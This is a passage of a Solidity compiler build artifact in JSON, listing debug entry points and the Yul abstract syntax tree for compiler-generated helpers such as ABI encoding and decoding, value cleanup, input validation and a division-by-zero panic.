								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 900,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 657,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 566,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 625,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 514,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 853,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 620,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 675,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 764,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3214:3",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "52:32:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "62:16:3",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "73:5:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "34:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "44:7:3",
														"type": ""
													}
												],
												"src": "7:77:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "155:53:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "172:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "195:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "177:17:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "177:24:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "165:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "165:37:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "165:37:3"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "143:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "150:3:3",
														"type": ""
													}
												],
												"src": "90:118:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "312:124:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "322:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "334:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "345:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "330:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "330:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "322:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "402:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "415:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "426:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "411:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "411:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "358:43:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "358:71:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "358:71:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "284:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "296:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "307:4:3",
														"type": ""
													}
												],
												"src": "214:222:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "484:48:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "494:32:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "519:5:3"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "512:6:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "512:13:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "505:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "505:21:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "494:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "466:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "476:7:3",
														"type": ""
													}
												],
												"src": "442:90:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "597:50:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "614:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "619:14:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "619:21:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "607:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "607:34:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "607:34:3"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "585:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "592:3:3",
														"type": ""
													}
												],
												"src": "538:109:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "745:118:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "755:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "767:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "778:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "763:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "763:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "755:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "829:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "842:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "853:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "838:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "838:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "791:37:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "791:65:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "791:65:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "717:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "729:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "740:4:3",
														"type": ""
													}
												],
												"src": "653:210:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "909:35:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "919:19:3",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "935:2:3",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "929:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "929:9:3"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "919:6:3"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "902:6:3",
														"type": ""
													}
												],
												"src": "869:75:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1039:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1056:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1059:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1049:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1049:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1049:12:3"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "950:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1162:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1179:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1182:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1172:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1172:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1172:12:3"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "1073:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1241:81:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1251:65:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1266:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1273:42:3",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1262:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1262:54:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1251:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1223:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1233:7:3",
														"type": ""
													}
												],
												"src": "1196:126:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1373:51:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1383:35:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1412:5:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1394:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1394:24:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1383:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1355:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1365:7:3",
														"type": ""
													}
												],
												"src": "1328:96:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1473:79:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1530:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1539:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1542:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1532:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1532:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1532:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1496:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1521:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "1503:17:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1503:24:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1493:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1493:35:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1486:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1486:43:3"
															},
															"nodeType": "YulIf",
															"src": "1483:63:3"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1466:5:3",
														"type": ""
													}
												],
												"src": "1430:122:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1610:87:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1620:29:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "1642:6:3"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "1629:12:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1629:20:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1620:5:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1685:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "1658:26:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1658:33:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1658:33:3"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "1588:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1596:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1604:5:3",
														"type": ""
													}
												],
												"src": "1558:139:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1769:263:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1815:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "1817:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1817:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1817:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1790:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1799:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1786:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1786:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1811:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1782:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1782:32:3"
															},
															"nodeType": "YulIf",
															"src": "1779:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "1908:117:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1923:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1937:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1927:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1952:63:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1987:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1998:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1983:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1983:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "2007:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1962:20:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1962:53:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1952:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1739:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1750:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1762:6:3",
														"type": ""
													}
												],
												"src": "1703:329:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2078:76:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2132:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2141:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2144:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2134:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2134:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2134:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2101:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2123:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2108:14:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2108:21:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2098:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2098:32:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2091:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2091:40:3"
															},
															"nodeType": "YulIf",
															"src": "2088:60:3"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2071:5:3",
														"type": ""
													}
												],
												"src": "2038:116:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2220:77:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2230:22:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "2245:6:3"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2239:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2239:13:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "2230:5:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2285:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "2261:23:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2261:30:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2261:30:3"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "2198:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "2206:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2214:5:3",
														"type": ""
													}
												],
												"src": "2160:137:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2377:271:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2423:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "2425:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2425:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2425:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "2398:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2407:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "2394:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2394:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2419:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "2390:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2390:32:3"
															},
															"nodeType": "YulIf",
															"src": "2387:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "2516:125:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "2531:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2545:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "2535:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "2560:71:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "2603:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "2614:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "2599:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2599:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "2623:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "2570:28:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2570:61:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "2560:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2347:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "2358:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2370:6:3",
														"type": ""
													}
												],
												"src": "2303:345:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2682:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2699:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2702:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2692:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2692:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2692:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2796:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2799:4:3",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2789:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2789:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2789:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2820:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2823:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2813:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2813:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2813:15:3"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2654:180:3"
											},
											{
												"body": {
